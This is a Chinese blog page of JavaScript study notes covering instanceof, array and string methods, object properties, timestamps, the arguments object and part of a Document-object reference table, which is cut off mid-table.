1.05rem;">面试<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/01/"><span class="card-archive-list-date">一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/11/"><span class="card-archive-list-date">十一月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/10/"><span class="card-archive-list-date">十月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/09/"><span class="card-archive-list-date">九月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url">学习笔记</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF/" itemprop="url">前端</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/javascript/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>javascript</span></a></span></div></div><h1 class="post-title" itemprop="name headline">重温前端-js篇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-02-03T07:42:00.000Z" title="发表于 2022-02-03 15:42:00">2022-02-03</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2022-10-14T06:35:32.861Z" title="更新于 2022-10-14 14:35:32">2022-10-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">27.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>106分钟</span></span><span class="post-meta-separator"></span><span class="leancloud_visitors" id="/post/c03c.html" data-flag-title="重温前端-js篇"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span class="leancloud-visitors-count" title="访问量"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为北京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>北京</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://kifimg.oss-cn-beijing.aliyuncs.com/project/202204241829907.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://wkif.gitee.io/post/c03c.html"><header><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url">学习笔记</a><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF/" itemprop="url">前端</a><a href="/tags/javascript/" tabindex="-1" itemprop="url">javascript</a><h1 id="CrawlerTitle" itemprop="name headline">重温前端-js篇</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">kif</span><time itemprop="dateCreated datePublished" datetime="2022-02-03T07:42:00.000Z" title="发表于 2022-02-03 15:42:00">2022-02-03</time><time itemprop="dateCreated datePublished" datetime="2022-10-14T06:35:32.861Z" title="更新于 2022-10-14 14:35:32">2022-10-14</time></header><h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><h3 id="1、JS中的instanceof运算符"><a href="#1、JS中的instanceof运算符" class="headerlink" title="1、JS中的instanceof运算符"></a>1、JS中的instanceof运算符</h3><p>instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上</p>
<pre class="line-numbers language-none"><code class="language-none">obj instanceof Object;&#x2F;&#x2F;true 实例obj在不在Object构造函数中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>eg：</p>
<p>请补全JavaScript函数，要求以Boolean的形式返回第一个参数是否属于第二个参数对象的实例。</p>
<pre class="line-numbers language-none"><code class="language-none">function _instanceof(left,right) &#123;
    &#x2F;&#x2F; 补全代码
    return (left instanceof right )
    
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2、排序"><a href="#2、排序" class="headerlink" title="2、排序"></a>2、排序</h3><p>sort() 方法对数组的项目进行排序。</p>
<p>按升序对数组中的数字进行排序：</p>
<pre class="line-numbers language-none"><code class="language-none">var points &#x3D; [40, 100, 1, 5, 25, 10];
points.sort(function(a, b)&#123;return a-b&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>按降序对数组中的数字进行排序：</p>
<pre class="line-numbers language-none"><code class="language-none">var points &#x3D; [40, 100, 1, 5, 25, 10];
points.sort(function(a, b)&#123;return b-a&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="3、JS字符串大写和小写之间的转换"><a href="#3、JS字符串大写和小写之间的转换" class="headerlink" title="3、JS字符串大写和小写之间的转换"></a>3、JS字符串大写和小写之间的转换</h3><p>String 字符串大小写转换方法</p>
<table>
<thead>
<tr>
<th>字符串方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>toLocaleLowerCase()</td>
<td>把字符串转换成小写</td>
</tr>
<tr>
<td>toLocaleUpperCase()</td>
<td>将字符串转换成大写</td>
</tr>
<tr>
<td>toLowerCase()</td>
<td>将字符串转换成小写</td>
</tr>
<tr>
<td>toUpperCase()</td>
<td>将字符串转换成大写</td>
</tr>
</tbody></table>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">"JavaScript"</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h3 id="4、javascript如何删除指定数组元素"><a href="#4、javascript如何删除指定数组元素" class="headerlink" title="4、javascript如何删除指定数组元素"></a>4、javascript如何删除指定数组元素</h3><ol>
<li><p>使用delete关键字；</p>
<pre class="line-numbers language-none"><code class="language-none">var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;];
delete colors[0];
console.log(colors); &#x2F;&#x2F; [undefined, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;]
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>使用delete删除元素之后数组长度不变，只是被删除元素被置为undefined了</strong></p>
</li>
<li><p>使用splice()操作方法；</p>
<pre class="line-numbers language-none"><code class="language-none">var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];
var color &#x3D; colors.splice(0, 1);
console.log(color); &#x2F;&#x2F; &quot;red&quot;
console.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在删除数组元素的时候，它可以删除任意数量的项，只需要指定2个参数：要删除的第一项的位置和要删除的项数。</p>
</li>
<li><p>迭代方法，用循环迭代数组元素，发现符合要删除的项则删除；</p>
<p>第一种用最常见的ForEach循环来对比元素找到之后将其删除。</p>
<pre class="line-numbers language-none"><code class="language-none">var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];
colors.forEach(function(item, index, arr) &#123;    if(item &#x3D;&#x3D;&#x3D; &quot;red&quot;) &#123;
        arr.splice(index, 1);
    &#125;
&#125;)
var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];
colors &#x3D; colors.filter(function(item) &#123;    return item !&#x3D; &quot;red&quot;&#125;); 
console.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>prototype原型方法，在Array的原型上添加方法来达到删除的目的。</p>
</li>
</ol>
<h3 id="5、数组方法"><a href="#5、数组方法" class="headerlink" title="5、数组方法"></a>5、数组方法</h3><h4 id="数组方法概括"><a href="#数组方法概括" class="headerlink" title="数组方法概括"></a>数组方法概括</h4><table>
<thead>
<tr>
<th>方法名</th>
<th align="left">对应版本</th>
<th align="left">功能</th>
<th align="left">原数组是否改变</th>
</tr>
</thead>
<tbody><tr>
<td>concat()</td>
<td align="left">ES5-</td>
<td align="left">合并数组，并返回合并之后的数据</td>
<td align="left">n</td>
</tr>
<tr>
<td>join()</td>
<td align="left">ES5-</td>
<td align="left">使用分隔符，将数组转为字符串并返回</td>
<td align="left">n</td>
</tr>
<tr>
<td>pop()</td>
<td align="left">ES5-</td>
<td align="left">删除最后一位，并返回删除的数据</td>
<td align="left">y</td>
</tr>
<tr>
<td>shift()</td>
<td align="left">ES5-</td>
<td align="left">删除第一位，并返回删除的数据</td>
<td align="left">y</td>
</tr>
<tr>
<td>unshift()</td>
<td align="left">ES5-</td>
<td align="left">在第一位新增一或多个数据，返回长度</td>
<td align="left">y</td>
</tr>
<tr>
<td>push()</td>
<td align="left">ES5-</td>
<td align="left">在最后一位新增一或多个数据，返回长度</td>
<td align="left">y</td>
</tr>
<tr>
<td>reverse()</td>
<td align="left">ES5-</td>
<td align="left">反转数组，返回结果</td>
<td align="left">y</td>
</tr>
<tr>
<td>slice()</td>
<td align="left">ES5-</td>
<td align="left">截取指定位置的数组，并返回</td>
<td align="left">n</td>
</tr>
<tr>
<td>sort()</td>
<td align="left">ES5-</td>
<td align="left">排序（字符规则），返回结果</td>
<td align="left">y</td>
</tr>
<tr>
<td>splice()</td>
<td align="left">ES5-</td>
<td align="left">删除指定位置，并替换，返回删除的数据</td>
<td align="left">y</td>
</tr>
<tr>
<td>toString()</td>
<td align="left">ES5-</td>
<td align="left">直接转为字符串，并返回</td>
<td align="left">n</td>
</tr>
<tr>
<td>valueOf()</td>
<td align="left">ES5-</td>
<td align="left">返回数组对象的原始值</td>
<td align="left">n</td>
</tr>
<tr>
<td>indexOf()</td>
<td align="left">ES5</td>
<td align="left">查询并返回数据的索引</td>
<td align="left">n</td>
</tr>
<tr>
<td>lastIndexOf()</td>
<td align="left">ES5</td>
<td align="left">反向查询并返回数据的索引</td>
<td align="left">n</td>
</tr>
<tr>
<td>forEach()</td>
<td align="left">ES5</td>
<td align="left">参数为回调函数，会遍历数组所有的项，回调函数接受三个参数，分别为value，index，self；forEach没有返回值</td>
<td align="left">n</td>
</tr>
<tr>
<td>map()</td>
<td align="left">ES5</td>
<td align="left">同forEach，同时回调函数返回数据，组成新数组由map返回</td>
<td align="left">n</td>
</tr>
<tr>
<td>filter()</td>
<td align="left">ES5</td>
<td align="left">同forEach，同时回调函数返回布尔值，为true的数据组成新数组由filter返回</td>
<td align="left">n</td>
</tr>
<tr>
<td>every()</td>
<td align="left">ES5</td>
<td align="left">同forEach，同时回调函数返回布尔值，全部为true，由every返回true</td>
<td align="left">n</td>
</tr>
<tr>
<td>some()</td>
<td align="left">ES5</td>
<td align="left">同forEach，同时回调函数返回布尔值，只要由一个为true，由some返回true</td>
<td align="left">n</td>
</tr>
<tr>
<td>reduce()</td>
<td align="left">ES5</td>
<td align="left">归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduce返回</td>
<td align="left">n</td>
</tr>
<tr>
<td>reduceRight()</td>
<td align="left">ES5</td>
<td align="left">反向归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduceRight返回</td>
<td align="left">n</td>
</tr>
</tbody></table>
<p><strong>用slice(0)复制一个数组</strong></p>
<p><strong>a.splice(index,0,item)：在数组a的第index位置插入item</strong></p>
<p><strong>最大值 ;Math.max.apply(Math,array)</strong></p>
<h3 id="6、对象"><a href="#6、对象" class="headerlink" title="6、对象"></a>6、对象</h3><h4 id="Number-对象"><a href="#Number-对象" class="headerlink" title="Number 对象"></a>Number 对象</h4><p>Number 对象是原始数值的包装对象，创建 Number 对象的语法格式如下：</p>
<pre class="line-numbers language-none"><code class="language-none">var myNum &#x3D; new Number(value);
var myNum &#x3D; Number(value);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>其中 value 为要创建的 Number 对象的数值，若 value 为一个非数字的值，则会尝试将其转换为数字，若转换失败则会返回 NaN。</p>
<p>eg:请补全JavaScript函数，要求将数字参数转换为对象的形式返回。</p>
<pre class="line-numbers language-none"><code class="language-none">function _numbertoobject(number) &#123;
    &#x2F;&#x2F; 补全代码
    var myNum &#x3D; new Number(number);
    return myNum
    
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="对象字符串"><a href="#对象字符串" class="headerlink" title="对象字符串"></a><strong>对象字符串</strong></h4><p>JavaScript String 对象用于处理字符串，其中提供了大量操作字符串的方法，以及一些属性。</p>
<p>创建 String 对象的语法格式如下：</p>
<pre class="line-numbers language-none"><code class="language-none">var val &#x3D; new String(value);
var val &#x3D; String(value);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>













<h4 id="对象属性遍历："><a href="#对象属性遍历：" class="headerlink" title="对象属性遍历："></a>对象属性遍历：</h4><ul>
<li><p>使用 for in 循环遍历对象的属性时，<strong>原型链上的所有属性</strong>都将被访问：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> obj<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">"name"</span><span class="token operator">:</span><span class="token string">"wjy"</span><span class="token punctuation">,</span><span class="token string-property property">"age"</span><span class="token operator">:</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token string-property property">"sex"</span><span class="token operator">:</span><span class="token string">"female"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//定义一个object对象   </span>
<span class="token keyword">var</span> keys<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//定义一个数组用来接受key   </span>
<span class="token keyword">var</span> values<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//定义一个数组用来接受value   </span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   
    keys<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>   
    values<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//取得value     </span>
    <span class="token punctuation">&#125;</span>   
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"keys is ："</span><span class="token operator">+</span>keys<span class="token operator">+</span><span class="token string">" and values is ："</span><span class="token operator">+</span>values<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>Object.keys(xx)&#x2F;Object.values(xx)</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//输出：["name", "career"]</span>
<span class="token comment">//输出：[ "Poly", "it"]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h4 id="添加属性"><a href="#添加属性" class="headerlink" title="添加属性"></a>添加属性</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//创建obj对象</span>
 <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">//为对象添加动态属性</span>
 obj<span class="token punctuation">.</span>userName <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
 obj<span class="token punctuation">.</span>passWord <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token punctuation">;</span>
 <span class="token comment">//输出</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="删除对象属性"><a href="#删除对象属性" class="headerlink" title="删除对象属性"></a>删除对象属性</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//创建obj动态对象</span>
<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//为对象添加动态属性</span>
obj<span class="token punctuation">.</span>userName <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span>passWord <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token punctuation">;</span>    
<span class="token comment">//移除属性</span>
<span class="token keyword">delete</span> obj<span class="token punctuation">.</span>passWord<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="7、字符串"><a href="#7、字符串" class="headerlink" title="7、字符串"></a>7、字符串</h3><h4 id="String-对象中的方法"><a href="#String-对象中的方法" class="headerlink" title="String 对象中的方法"></a>String 对象中的方法</h4><p>下表中列举了 String 对象中提供的方法及其描述信息：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>anchor()</td>
<td>创建一个 HTML 锚点，即生成一个<code>&lt;a&gt;</code>标签，标签的 name 属性为 anchor() 方法中的参数</td>
</tr>
<tr>
<td>big()</td>
<td>用大号字体显示字符串</td>
</tr>
<tr>
<td>blink()</td>
<td>显示闪动的字符串</td>
</tr>
<tr>
<td>bold()</td>
<td>使用粗体显示字符串</td>
</tr>
<tr>
<td>charAt()</td>
<td>返回在指定位置的字符</td>
</tr>
<tr>
<td>charCodeAt()</td>
<td>返回指定字符的 Unicode 编码</td>
</tr>
<tr>
<td>concat()</td>
<td>拼接字符串</td>
</tr>
<tr>
<td>fixed()</td>
<td>以打字机文本显示字符串</td>
</tr>
<tr>
<td>fontcolor()</td>
<td>使用指定的颜色来显示字符串</td>
</tr>
<tr>
<td>fontsize()</td>
<td>使用指定的尺寸来显示字符串</td>
</tr>
<tr>
<td>fromCharCode()</td>
<td>将字符编码转换为一个字符串</td>
</tr>
<tr>
<td>indexOf()</td>
<td>检索字符串，获取给定字符串在字符串对象中首次出现的位置</td>
</tr>
<tr>
<td>italics()</td>
<td>使用斜体显示字符串</td>
</tr>
<tr>
<td>lastIndexOf()</td>
<td>获取给定字符串在字符串对象中最后出现的位置</td>
</tr>
<tr>
<td>link()</td>
<td>将字符串显示为链接</td>
</tr>
<tr>
<td>localeCompare()</td>
<td>返回一个数字，并使用该数字来表示字符串对象是大于、小于还是等于给定字符串</td>
</tr>
<tr>
<td>match()</td>
<td>根据正则表达式匹配字符串中的字符</td>
</tr>
<tr>
<td>replace()</td>
<td>替换与正则表达式匹配的子字符串</td>
</tr>
<tr>
<td>search()</td>
<td>获取与正则表达式相匹配字符串首次出现的位置</td>
</tr>
<tr>
<td>slice()</td>
<td>截取字符串的片断，并将其返回</td>
</tr>
<tr>
<td>small()</td>
<td>使用小字号来显示字符串</td>
</tr>
<tr>
<td>split()</td>
<td>根据给定字符将字符串分割为字符串数组</td>
</tr>
<tr>
<td>strike()</td>
<td>使用删除线来显示字符串</td>
</tr>
<tr>
<td>sub()</td>
<td>把字符串显示为下标</td>
</tr>
<tr>
<td>substr()</td>
<td>从指定索引位置截取指定长度的字符串</td>
</tr>
<tr>
<td>substring()</td>
<td>截取字符串中两个指定的索引之间的字符</td>
</tr>
<tr>
<td>sup()</td>
<td>把字符串显示为上标</td>
</tr>
<tr>
<td>toLocaleLowerCase()</td>
<td>把字符串转换为小写</td>
</tr>
<tr>
<td>toLocaleUpperCase()</td>
<td>把字符串转换为大写</td>
</tr>
<tr>
<td>toLowerCase()</td>
<td>把字符串转换为小写</td>
</tr>
<tr>
<td>toUpperCase()</td>
<td>把字符串转换为大写</td>
</tr>
<tr>
<td>toString()</td>
<td>返回字符串</td>
</tr>
<tr>
<td>valueOf()</td>
<td>返回某个字符串对象的原始值</td>
</tr>
</tbody></table>
<h4 id="去除字符串左右两边的空格"><a href="#去除字符串左右两边的空格" class="headerlink" title="去除字符串左右两边的空格"></a>去除字符串左右两边的空格</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">"   123   "</span><span class="token punctuation">;</span>
str<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h3 id="8、js-时间与时间戳的转换"><a href="#8、js-时间与时间戳的转换" class="headerlink" title="8、js 时间与时间戳的转换"></a>8、js 时间与时间戳的转换</h3><h4 id="时间转时间戳："><a href="#时间转时间戳：" class="headerlink" title="时间转时间戳："></a>时间转时间戳：</h4><p>javascript获得时间戳的方法有四种，都是通过实例化时间对象 new Date() 来进一步获取当前的时间戳</p>
<pre class="line-numbers language-none"><code class="language-none">var timetamp4 &#x3D; Number(new Date()) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="时间戳转时间"><a href="#时间戳转时间" class="headerlink" title="时间戳转时间"></a>时间戳转时间</h4><pre class="line-numbers language-none"><code class="language-none">function _date(number) &#123;
  let date &#x3D; new Date(number);
  let y &#x3D; date.getFullYear();
  let m &#x3D; date.getMonth()+1;
  let d &#x3D; date.getDate();
  return (y + &quot;-&quot; + m + &quot;-&quot; + d);  
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="9、Arguments-对象"><a href="#9、Arguments-对象" class="headerlink" title="9、Arguments 对象"></a>9、Arguments 对象</h3><p><strong><code>arguments</code></strong> 是一个对应于传递给函数的参数的类数组对象。</p>
<pre class="line-numbers language-none"><code class="language-none">function func1(a, b, c) &#123;
  console.log(arguments[0]);
  &#x2F;&#x2F; expected output: 1

  console.log(arguments[1]);
  &#x2F;&#x2F; expected output: 2

  console.log(arguments[2]);
  &#x2F;&#x2F; expected output: 3
&#125;

func1(1, 2, 3);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="10、Document-对象"><a href="#10、Document-对象" class="headerlink" title="10、Document 对象"></a>10、Document 对象</h3><h4 id="Document-对象属性和方法"><a href="#Document-对象属性和方法" class="headerlink" title="Document 对象属性和方法"></a>Document 对象属性和方法</h4><p>HTML文档中可以使用以下属性和方法:</p>
<table>
<thead>
<tr>
<th align="left">属性 &#x2F; 方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-document-activeelement.html">document.activeElement</a></td>
<td align="left">返回当前获取焦点元素</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-addeventlistener.html">document.addEventListener()</a></td>
<td align="left">向文档添加句柄</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-document-adoptnode.html">document.adoptNode(node)</a></td>
<td align="left">从另外一个文档返回 adapded 节点到当前文档。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/coll-doc-anchors.html">document.anchors</a></td>
<td align="left">返回对文档中所有 Anchor 对象的引用。</td>
</tr>
<tr>
<td align="left">document.applets</td>
<td align="left">返回对文档中所有 Applet 对象的引用。<strong>注意:</strong> HTML5 已不支持 <applet> 元素。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-baseuri.html">document.baseURI</a></td>
<td align="left">返回文档的绝对基础 URI</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-body.html">document.body</a></td>
<td align="left">返回文档的body元素</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-doc-close.html">document.close()</a></td>
<td align="left">关闭用 document.open() 方法打开的输出流，并显示选定的数据。</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-cookie.html">document.cookie</a></td>
<td align="left">设置或返回与当前文档有关的所有 cookie。</td>
</tr>
<tr>
